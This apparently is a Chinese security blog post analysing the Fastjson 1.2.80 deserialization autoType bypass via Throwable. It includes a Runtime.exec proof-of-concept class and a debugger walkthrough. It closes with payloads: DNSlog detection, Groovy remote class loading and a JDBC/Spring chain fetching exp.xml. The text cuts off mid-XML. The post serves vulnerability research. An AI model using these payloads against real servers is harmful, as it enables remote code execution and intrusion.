+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86>#</a></h2><p>原理还是基于 Fastjson 反序列化恢复类实例时，需要恢复用到的类属性，而<code>checkAutoType()</code>中期望类机制会在实例化类属性的对应类后将其加入到类缓存<code>mappings</code>中。如果这个属性是可利用的类且我们可控，可以直接利用或者进一步横向扩展出其他类间接利用。依靠属性名赋值时的隐式类间关系，不再需要在 JSON 中显式指定<code>@type</code>，从缓存中取类在修复前不会判断<code>autoTypeSupport</code>，从而绕过了<code>autoType</code>的白名单检查。</p><p>而 1.2.80 使用的是另一个期望类，即异常类<code>Throwable</code>。</p><h2 id=漏洞复现>漏洞复现
+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0>#</a></h2><p>直接导入对应版本的 Fastjson 的依赖：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;dependencies&gt;</span>
+</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;dependency&gt;</span>
+</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;groupId&gt;</span>com.alibaba<span style=color:#f92672>&lt;/groupId&gt;</span>
+</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;artifactId&gt;</span>fastjson<span style=color:#f92672>&lt;/artifactId&gt;</span>
+</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;version&gt;</span>1.2.80<span style=color:#f92672>&lt;/version&gt;</span>
+</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/dependency&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><p>先写一个继承了<code>Exception</code>的类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.solowalker.fastjson.poc;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Poc</span> <span style=color:#66d9ef>extends</span> Exception{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setName</span>(String str) <span style=color:#66d9ef>throws</span> IOException {
+</span></span><span style=display:flex><span>        Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(str);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后进行反序列化：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.solowalker.fastjson.poc;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.JSON;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>PocDemo</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>        String json <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{\&#34;@type\&#34;:\&#34;java.lang.Exception\&#34;,\&#34;@type\&#34;:\&#34;com.solowalker.fastjson.poc.Poc\&#34;,\&#34;name\&#34;:\&#34;calc\&#34;}&#34;</span>;
+</span></span><span style=display:flex><span>        JSON.<span style=color:#a6e22e>parse</span>(json);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>![屏幕截图 2026-11-18 220651](/images/screenshots/屏幕截图 2026-11-18 220651.png)</p><p>成功弹出计算器。</p><h2 id=调试分析>调试分析
+<a class=anchor href=#%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90>#</a></h2><p>先在<code>parse()</code>这里打个断点，简单看一下反序列化的过程。</p><p>跟进到下图的方法：</p><p>![屏幕截图 2026-11-19 140543](/images/screenshots/屏幕截图 2026-11-19 140543.png)</p><p>这里会创建一个<code>DefaultJSONParser</code>来解析我们的 JSON 字符串，然后调用<code>parse()</code>开始识别 JSON 结构，当这个方法遇到<code>{</code>的时候，知道要反序列化一个对象，然后进入<code>parseObject()</code>的逻辑。下面来看一下其中的代码实现。</p><p>跟进到下图的函数：</p><p>![屏幕截图 2026-11-19 141133](/images/screenshots/屏幕截图 2026-11-19 141133.png)</p><p>这里看一下它的具体实现：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>parse</span>(Object fieldName) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> JSONLexer lexer <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>lexer</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>switch</span> (lexer.<span style=color:#a6e22e>token</span>()) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> SET:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                HashSet<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> set <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>                parseArray(set, fieldName);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> set;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> TREE_SET:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                TreeSet<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> treeSet <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TreeSet<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>                parseArray(treeSet, fieldName);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> treeSet;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> LBRACKET:
+</span></span><span style=display:flex><span>                Collection array <span style=color:#f92672>=</span> isEnabled(Feature.<span style=color:#a6e22e>UseNativeJavaObject</span>)
+</span></span><span style=display:flex><span>                        <span style=color:#f92672>?</span> <span style=color:#66d9ef>new</span> ArrayList()
+</span></span><span style=display:flex><span>                        : <span style=color:#66d9ef>new</span> JSONArray();
+</span></span><span style=display:flex><span>                parseArray(array, fieldName);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (lexer.<span style=color:#a6e22e>isEnabled</span>(Feature.<span style=color:#a6e22e>UseObjectArray</span>)) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> array.<span style=color:#a6e22e>toArray</span>();
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> array;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> LBRACE:
+</span></span><span style=display:flex><span>                Map object <span style=color:#f92672>=</span> isEnabled(Feature.<span style=color:#a6e22e>UseNativeJavaObject</span>)
+</span></span><span style=display:flex><span>                    <span style=color:#f92672>?</span> lexer.<span style=color:#a6e22e>isEnabled</span>(Feature.<span style=color:#a6e22e>OrderedField</span>)
+</span></span><span style=display:flex><span>                    <span style=color:#f92672>?</span> <span style=color:#66d9ef>new</span> HashMap()
+</span></span><span style=display:flex><span>                    : <span style=color:#66d9ef>new</span> LinkedHashMap()
+</span></span><span style=display:flex><span>                    : <span style=color:#66d9ef>new</span> JSONObject(lexer.<span style=color:#a6e22e>isEnabled</span>(Feature.<span style=color:#a6e22e>OrderedField</span>));
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> parseObject(object, fieldName);
+</span></span><span style=display:flex><span><span style=color:#75715e>//            case LBRACE: {</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                Map&lt;String, Object&gt; map = lexer.isEnabled(Feature.OrderedField)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                        ? new LinkedHashMap&lt;String, Object&gt;()</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                        : new HashMap&lt;String, Object&gt;();</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                Object obj = parseObject(map, fieldName);</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                if (obj != map) {</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                    return obj;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                }</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//                return new JSONObject(map);</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//            }</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> LITERAL_INT:
+</span></span><span style=display:flex><span>                Number intValue <span style=color:#f92672>=</span> lexer.<span style=color:#a6e22e>integerValue</span>();
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> intValue;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> LITERAL_FLOAT:
+</span></span><span style=display:flex><span>                Object value <span style=color:#f92672>=</span> lexer.<span style=color:#a6e22e>decimalValue</span>(lexer.<span style=color:#a6e22e>isEnabled</span>(Feature.<span style=color:#a6e22e>UseBigDecimal</span>));
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> value;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> LITERAL_STRING:
+</span></span><span style=display:flex><span>                String stringLiteral <span style=color:#f92672>=</span> lexer.<span style=color:#a6e22e>stringVal</span>();
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>(JSONToken.<span style=color:#a6e22e>COMMA</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (lexer.<span style=color:#a6e22e>isEnabled</span>(Feature.<span style=color:#a6e22e>AllowISO8601DateFormat</span>)) {
+</span></span><span style=display:flex><span>                    JSONScanner iso8601Lexer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> JSONScanner(stringLiteral);
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (iso8601Lexer.<span style=color:#a6e22e>scanISO8601DateIfMatch</span>()) {
+</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>return</span> iso8601Lexer.<span style=color:#a6e22e>getCalendar</span>().<span style=color:#a6e22e>getTime</span>();
+</span></span><span style=display:flex><span>                        }
+</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>finally</span> {
+</span></span><span style=display:flex><span>                        iso8601Lexer.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>                    }
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> stringLiteral;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> NULL:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> UNDEFINED:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> TRUE:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> Boolean.<span style=color:#a6e22e>TRUE</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> FALSE:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> Boolean.<span style=color:#a6e22e>FALSE</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> NEW:
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>(JSONToken.<span style=color:#a6e22e>IDENTIFIER</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (lexer.<span style=color:#a6e22e>token</span>() <span style=color:#f92672>!=</span> JSONToken.<span style=color:#a6e22e>IDENTIFIER</span>) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> JSONException(<span style=color:#e6db74>&#34;syntax error&#34;</span>);
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>(JSONToken.<span style=color:#a6e22e>LPAREN</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                accept(JSONToken.<span style=color:#a6e22e>LPAREN</span>);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>long</span> time <span style=color:#f92672>=</span> lexer.<span style=color:#a6e22e>integerValue</span>().<span style=color:#a6e22e>longValue</span>();
+</span></span><span style=display:flex><span>                accept(JSONToken.<span style=color:#a6e22e>LITERAL_INT</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                accept(JSONToken.<span style=color:#a6e22e>RPAREN</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> Date(time);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> EOF:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (lexer.<span style=color:#a6e22e>isBlankInput</span>()) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> JSONException(<span style=color:#e6db74>&#34;unterminated json string, &#34;</span> <span style=color:#f92672>+</span> lexer.<span style=color:#a6e22e>info</span>());
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> HEX:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> lexer.<span style=color:#a6e22e>bytesValue</span>();
+</span></span><span style=display:flex><span>                lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> bytes;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> IDENTIFIER:
+</span></span><span style=display:flex><span>                String identifier <span style=color:#f92672>=</span> lexer.<span style=color:#a6e22e>stringVal</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>&#34;NaN&#34;</span>.<span style=color:#a6e22e>equals</span>(identifier)) {
+</span></span><span style=display:flex><span>                    lexer.<span style=color:#a6e22e>nextToken</span>();
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> JSONException(<span style=color:#e6db74>&#34;syntax error, &#34;</span> <span style=color:#f92672>+</span> lexer.<span style=color:#a6e22e>info</span>());
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> ERROR:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>default</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> JSONException(<span style=color:#e6db74>&#34;syntax error, &#34;</span> <span style=color:#f92672>+</span> lexer.<span style=color:#a6e22e>info</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p><code>lexer.token()</code>是当前 JSON 词法单元的类型。由于我们构造的是<code>{</code>，所以<code>lexer.token()</code>就是<code>LBRACE</code>，然后进入<code>parseObject()</code>分支。</p><p>![屏幕截图 2026-11-19 141610](/images/screenshots/屏幕截图 2026-11-19 141610.png)</p><p>这里先创建了一个容器对象，默认是<code>JSONObject</code>，然后调用<code>parseObject(object, fieldName)</code>，将我们传入的 JSON 内容给填充到这个<code>JSONObject</code>中。跟进到<code>parseObject()</code>中。</p><p>![屏幕截图 2026-11-19 145429](/images/screenshots/屏幕截图 2026-11-19 145429.png)</p><p>一直走到这。payload 中第一个键就是<code>@type</code>。再往下到<code>clazz = config.checkAutoType(typeName, null, lexer.getFeatures());</code>这一行。</p><p>![屏幕截图 2026-11-19 145754](/images/screenshots/屏幕截图 2026-11-19 145754.png)</p><p>这里第一次调用<code>checkAutoType()</code>，此时第二个参数是<code>null</code>，也就是<code>expectClass = null</code>。因为<code>java.lang.Exception</code>类事先被 Fastjson 保存到了缓存中，所以在处理这个类的时候直接设置<code>expectClass = null</code>。</p><p>![屏幕截图 2026-11-19 151043](/images/screenshots/屏幕截图 2026-11-19 151043.png)</p><p>调试的时候也能发现，<code>java.lang.Exception</code>类是直接从缓存 mapping 中取出来的，然后直接返回这个类。返回到<code>parseObject()</code>这个方法中，再往下走，走到这里：</p><p>![屏幕截图 2026-11-19 151736](/images/screenshots/屏幕截图 2026-11-19 151736.png)</p><p>这里获取对象反序列化器可以跟进去看一下，实际上就是经历了一系列判断，然后返回了一个<code>ThrowableDeserializer</code>对象。</p><p>![屏幕截图 2026-11-19 152502](/images/screenshots/屏幕截图 2026-11-19 152502.png)</p><p>然后走到<code>Object obj = deserializer.deserialze(this, clazz, fieldName);</code>这里，跟进去。</p><p>![屏幕截图 2026-11-19 153405](/images/screenshots/屏幕截图 2026-11-19 153405.png)</p><p>首先确定了当前处理的是一个<code>Throwable</code>类型，然后开始第二次<code>checkAytoType()</code>。</p><p>![屏幕截图 2026-11-19 153725](/images/screenshots/屏幕截图 2026-11-19 153725.png)</p><p>这里拿到的<code>key</code>其实是 payload 中的第二个<code>@type</code>，指向了我们的 POC。然后提取 payload 中的类名，进入<code>checkAutoType()</code>，而此时<code>checkAutoType()</code>的第二个参数是<code>Throwable.class</code>。然后对<code>expectClass</code>这个参数也就是我们传入的<code>Throwable.class</code>计算哈希，而<code>Throwable.class</code>不在黑名单中，所以会设置<code>expectClassFlag</code>为<code>true</code>，这样才能后续走到<code>loadClass</code>来加载我的恶意类。</p><p>![屏幕截图 2026-11-19 155124](/images/screenshots/屏幕截图 2026-11-19 155124.png)</p><p>一直到这里才开始加载我们的恶意类：</p><p>![屏幕截图 2026-11-19 160804](/images/screenshots/屏幕截图 2026-11-19 160804.png)</p><p>这里其实由于<code>expectClassFlag</code>为<code>true</code>，所以已经可以加载我们的恶意类了。然后跟进到<code>loadClass()</code>里看一下。</p><p>![屏幕截图 2026-11-19 161421](/images/screenshots/屏幕截图 2026-11-19 161421.png)</p><p>一直到这里，我们的恶意类被加载。类被加载后会被放到 Fastjson 全局缓存的地方。然后回到<code>ThrowableDeserializer</code>类中。一直走到这里才会调用我们的恶意<code>setter</code>：</p><p>![屏幕截图 2026-11-19 162345](/images/screenshots/屏幕截图 2026-11-19 162345.png)</p><p>通过调试时边上的变量的值我们就可以发现，这里成功执行了恶意<code>setter</code>，把<code>calc</code>命令注入进去。</p><p>至此，整个绕过流程已经分析完毕。</p><h2 id=poc>POC
+<a class=anchor href=#poc>#</a></h2><p>由于 Fastjson 高版本想要实现 RCE 基本都需要利用第三方依赖才能实现，所以利用条件相对苛刻，但是在 SRC 挖掘中不需要实现 RCE，只要能够证明漏洞存在即可，所以这一类的 POC 比较容易利用，比如利用 Fastjson 本身的异常类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Exception&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;com.alibaba.fastjson.JSONException&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;x&#34;</span>:{
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.net.InetSocketAddress&#34;</span>{<span style=color:#f92672>&#34;address&#34;</span>:,<span style=color:#f92672>&#34;val&#34;</span>:<span style=color:#e6db74>&#34;dnslog&#34;</span>}
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{<span style=color:#f92672>&#34;a&#34;</span>:{<span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Exception&#34;</span>,<span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;com.alibaba.fastjson.JSONException&#34;</span>,<span style=color:#f92672>&#34;x&#34;</span>:{<span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.net.InetSocketAddress&#34;</span>{<span style=color:#f92672>&#34;address&#34;</span>:,<span style=color:#f92672>&#34;val&#34;</span>:<span style=color:#e6db74>&#34;dnslog&#34;</span>}}},<span style=color:#f92672>&#34;b&#34;</span>:{<span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Exception&#34;</span>,<span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;com.alibaba.fastjson.JSONException&#34;</span>,<span style=color:#f92672>&#34;message&#34;</span>:{<span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.net.InetSocketAddress&#34;</span>{<span style=color:#f92672>&#34;address&#34;</span>:,<span style=color:#f92672>&#34;val&#34;</span>:<span style=color:#e6db74>&#34;dnslog&#34;</span>}}}}
+</span></span></code></pre></div><p>想要实现 RCE，一般会用到以下几种：</p><ul><li><code>Groovy</code>实现 RCE</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Exception&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.codehaus.groovy.control.CompilationFailedException&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;unit&#34;</span>:{}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.codehaus.groovy.control.ProcessingUnit&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;config&#34;</span>:{
+</span></span><span style=display:flex><span>     <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.codehaus.groovy.control.CompilerConfiguration&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#f92672>&#34;classpathList&#34;</span>:<span style=color:#e6db74>&#34;http://127.0.0.1:9999/&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这个 POC 需要服务端有<code>groovy-all</code>这样的<code>Groovy</code>库。整体的攻击思路就是：第一阶段进行缓存投毒，通过<code>unit</code>字段来实现<code>TypeUtils.cast</code>，在转换过程中调用<code>getDeserializer(ProcessingUnit.class)</code>，从而创建出<code>ProcessingUnit</code>的反序列化器并放入<code>deserializer</code>缓存；第二阶段通过第一步的投毒来触发远程类加载，通过<code>JavaStubCompilationUnit</code>的构造函数接收<code>config</code>参数来实现攻击。</p><p>这种攻击方式的具体实现可以参考这篇文章：<a href=https://www.freebuf.com/vuls/354868.html>Fastjson1.2.80反序列化漏洞分析与利用 - FreeBuf网络安全行业门户</a></p><p>还有一些其他的 payload：</p><p><code>JDBC</code>连接 RCE：依赖于<code>jython + psql + spring-context</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;a&#34;</span>:{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Exception&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.python.antlr.ParseException&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;type&#34;</span>:{}
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;b&#34;</span>:{
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.python.core.PyObject&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;com.ziclix.python.sql.PyConnection&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;connection&#34;</span>:{
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.postgresql.jdbc.PgConnection&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;hostSpecs&#34;</span>:[
+</span></span><span style=display:flex><span>                {
+</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;host&#34;</span>:<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>,
+</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;port&#34;</span>:<span style=color:#ae81ff>2333</span>
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            ],
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;user&#34;</span>:<span style=color:#e6db74>&#34;user&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;database&#34;</span>:<span style=color:#e6db74>&#34;test&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;info&#34;</span>:{
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;socketFactory&#34;</span>:<span style=color:#e6db74>&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;socketFactoryArg&#34;</span>:<span style=color:#e6db74>&#34;http://127.0.0.1:8090/exp.xml&#34;</span>
+</span></span><span style=display:flex><span>            },
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;url&#34;</span>:<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>加载的<code>exp.xml</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;beans</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://www.springframework.org/schema/beans
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;bean</span> <span style=color:#a6e22e>id=</span><span style=color:#e6db74>&#34;pb&#34;</span> <span style=color:#a6e22e>class=</span><span style=color:#e6db74>&#34;java.lang.ProcessBuilder&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;constructor-arg&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;list</span> <span style=color:#a6e22e>value-type=</span><span style=color:#e6db74>&#34;java.lang.String&#34;</span> <span style=color:#f92672>&gt;</span>
